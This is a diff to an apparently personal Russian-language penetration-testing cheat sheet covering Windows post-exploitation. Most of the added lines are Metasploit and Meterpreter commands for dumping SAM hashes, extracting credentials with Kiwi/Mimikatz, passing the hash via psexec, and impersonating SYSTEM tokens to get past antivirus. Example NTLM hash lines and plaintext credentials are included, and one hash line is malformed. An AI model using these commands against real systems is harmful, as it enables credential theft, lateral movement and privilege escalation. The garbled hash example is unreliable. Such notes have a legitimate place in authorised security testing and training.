@@ -492,13 +492,46 @@ $ python wmiexec.py ignite/Administrator:Qq123@192.168.1.195 dir
 
 
 (5985) WinRM (легитимный, но включен не везде. Сразу получаем powershell)
-gem install evil-winrm
+$ gem install evil-winrm
 $ evil-winrm -i 192.168.1.105 -u Administrator -p 'Qq123'
 
 
 
-NTLM Hash
 
+NTLM Hash
+Хранится в WINDOWS/system32/config/sam
+Для расшифровки нужен файл WINDOWS/system32/config/system
+Administrator:500:01fc5a353edafff4cb37са4ee:5412abx756e64d84cb735a46cbac:::
+^login        ^RID^LM hash    (4ee = empty) ^NT hash    (9c0 = disabled)
+
+
+
+Hash Dump
+С правами локального админа дампим хеши
+meterpreter> hashdump
+
+Mimikatz & Kiwi
+meterpreter> load kiwi		Загружаем модуль Kiwi
+meterpreter> help		Появляется много возможны паролей для извлечения
+meterpreter> creds_all		Вытаскиваем все пароли
+
+
+
+Pass the Hash
+msf6> use auxiliary/scanner/smb/smb_login	Проверяем, подходит ли наш хеш
+msf6> set SMBpass <hash>
+msf6> use exploit/windows/smb/psexec
+msf6> set SMBpass <hash>			Используем хеш вместо пароля
+
+
+
+Impersonate token 
+meterpreter> getsystem		Получить права системы за один клик, если есть такая возможность
+
+Если антивирус не дает повысить привилегии другим образом (реально работает!)
+meterpreter> load incognito
+meterpreter> list_tokens -u
+meterpreter> impersonate_token "NT AUTHORITY\\SYSTEM"
 
 
 
@@ -511,10 +544,19 @@ kiwi
 Если антивирус не дает нам сделать никакой из дампов
 meterpreter> load incognito
 meterpreter> list_tokens -u
-meterpreter> impersonate_token "NT_AUTHORITY\\SYSTEM"
+meterpreter> impersonate_token "NT AUTHORITY\\SYSTEM"
 
 
 
+Group Policy
+\\<DOMAIN>\SYSVOL\<DOMAIN>\Policies\		Хранилище груповых политик
+
+
+
+
+
+239
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:a4816afb5a756771974bd33c742f4914:::
 
 Bash
 Ctrl + R	Найти ии выполнить команду из истории
